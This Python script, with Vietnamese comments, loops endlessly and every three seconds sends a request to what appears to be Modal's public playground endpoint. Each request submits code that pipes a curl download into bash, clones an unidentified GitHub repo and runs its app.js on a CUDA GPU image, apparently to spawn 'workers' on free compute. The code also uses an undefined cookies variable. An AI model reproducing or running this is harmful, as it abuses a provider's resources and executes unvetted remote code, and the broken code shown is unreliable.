import requests
import time
headers = {
    'sec-ch-ua-platform': '"Windows"',
    'Referer': '',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'baggage': 'sentry-environment=production,sentry-release=740e16f266fa4963a8d9ded3409a4c6a,sentry-public_key=d75f7cb747cd4fe8ac03973ae3d39fec,sentry-trace_id=f5df0560e296ea85128b2a0b5b105f56,sentry-sample_rand=0.46471945597863906',
    'sentry-trace': 'f5df0560e296ea85128b2a0b5b105f56-98f3b723c2d06ce3',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    'content-type': 'application/json',
}

json_data = {
    'tutorial': 'get_started',
    'code': 'import subprocess\nimport modal\n\n# Vẫn tạo image có CUDA + Python\nimage = (\n    modal.Image.from_registry("nvidia/cuda:12.4.0-devel-ubuntu22.04", add_python="3.11")\n    .pip_install("cupy-cuda12x")\n)\n\n# 1) Cập nhật gói và cài git + curl + gnupg\nsubprocess.run(["apt-get", "update", "-y"], check=True)\nsubprocess.run(["apt-get", "install", "-y", "git", "curl", "gnupg"], check=True)\n\n# 2) Cài Node.js (LTS 18)\nsubprocess.run(\n    "curl -fsSL https://deb.nodesource.com/setup_18.x | bash -",\n    shell=True,\n    check=True\n)\nsubprocess.run(["apt-get", "install", "-y", "nodejs"], check=True)\n\n# 3) Clone repo\nsubprocess.run(["git", "clone", "https://github.com/vudeptrai79019-lgtm/tool.git"], check=False)\n\n# 4) Chạy node app.js và giữ tiến trình\nprocess = subprocess.Popen(\n    ["node", "app.js"],\n    cwd="tool"\n)\n\nprocess.wait()',
    'modalEnvironment': 'main',
    'winsize': {
        'rows': 16,
        'cols': 93,
    },
}

response = requests.post('https://modal.com/api/playground/vudeptrai79019/run', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"tutorial":"get_started","code":"import subprocess\\nimport modal\\n\\n# Vẫn tạo image có CUDA + Python\\nimage = (\\n    modal.Image.from_registry(\\"nvidia/cuda:12.4.0-devel-ubuntu22.04\\", add_python=\\"3.11\\")\\n    .pip_install(\\"cupy-cuda12x\\")\\n)\\n\\n# 1) Cập nhật gói và cài git + curl + gnupg\\nsubprocess.run([\\"apt-get\\", \\"update\\", \\"-y\\"], check=True)\\nsubprocess.run([\\"apt-get\\", \\"install\\", \\"-y\\", \\"git\\", \\"curl\\", \\"gnupg\\"], check=True)\\n\\n# 2) Cài Node.js (LTS 18)\\nsubprocess.run(\\n    \\"curl -fsSL https://deb.nodesource.com/setup_18.x | bash -\\",\\n    shell=True,\\n    check=True\\n)\\nsubprocess.run([\\"apt-get\\", \\"install\\", \\"-y\\", \\"nodejs\\"], check=True)\\n\\n# 3) Clone repo\\nsubprocess.run([\\"git\\", \\"clone\\", \\"https://github.com/vudeptrai79019-lgtm/tool.git\\"], check=False)\\n\\n# 4) Chạy node app.js và giữ tiến trình\\nprocess = subprocess.Popen(\\n    [\\"node\\", \\"app.js\\"],\\n    cwd=\\"tool\\"\\n)\\n\\nprocess.wait()","modalEnvironment":"main","winsize":{"rows":16,"cols":93}}'.encode()
#response = requests.post('https://modal.com/api/playground/vudeptrai79019/run', headers=headers, data=data)
url = 'https://modal.com/api/playground/vudeptrai79019/run'
delay = 3  

def main():
    while True:
        try:
            resp = requests.post(
                url,
                cookies=cookies,
                headers=headers,
                json=json_data,
                timeout=10  
            )
            print(f"Đã tạo worker thành công | Status: {resp.status_code}")
        except requests.exceptions.Timeout:
            print("Request bị timeout, thử lại sau...")
        except Exception as e:
            print(f"Tạo worker với lỗi: {e}")

        for i in range(delay, 0, -1):
            print(f"Đợi {i} giây...", end="\r", flush=True)
            time.sleep(1)


if __name__ == "__main__":
    main()





